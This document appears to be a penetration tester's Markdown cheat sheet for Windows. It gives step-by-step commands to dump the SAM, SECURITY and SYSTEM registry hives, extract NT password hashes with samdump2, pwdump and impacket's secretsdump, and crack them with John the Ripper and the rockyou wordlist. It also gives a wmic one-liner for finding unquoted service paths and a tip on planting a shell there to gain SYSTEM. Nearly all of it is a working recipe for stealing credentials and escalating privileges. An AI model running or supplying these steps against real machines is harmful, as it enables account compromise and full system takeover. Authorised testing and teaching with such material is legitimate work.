## Useful commands
### net
#### To list the user accounts on system
```cmd
net user
```
#### To details of the user account on system
```cmd
net user Administrator
```
## Obtain Windows Passwords.
### Windows Credentials will be store in sam database
```cmd
dir \windows\system32\config
```
### Take the backup of the registry 
```cmd
reg save hklm\sam sam.save
reg save hklm\security security.save
reg save hklm\system system.save
```
### Process these files to extract the hashes
Copy these files to Kali and run below commands to extract the hashes:
#### Method1: Using samdump2
```bash
samdump2 system.save sam.save
``` 
#### Method2: Using pwdump
```bash
pwdump system.save sam.save
``` 
#### Method3: Using secretsdump.py from python-impacket
```bash
python /usr/share/doc/python-impacket/examples/secretsdump.py -sam sam.save -system system.save LOCAL
``` 
### Extract the hashes to plain text
#### Use john ripper to extract the hashes
Copy the hashes obtained from above step into the file `myhash.txt` and run below command.
```bash
john myhash.txt --wordlist=/usr/share/wordlist/rockyou.txt --format=NT-old
```
## miscellaneous

## Priv Esc
### Abusing windows services
[Twitter](https://twitter.com/nullenc0de/status/1100236352766050305)
1) wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
2) Unquoted services that contain spaces = SYSTEM.

i.e. If binary is c:\Program Files\blah.exe. Place shell in c:\program.exe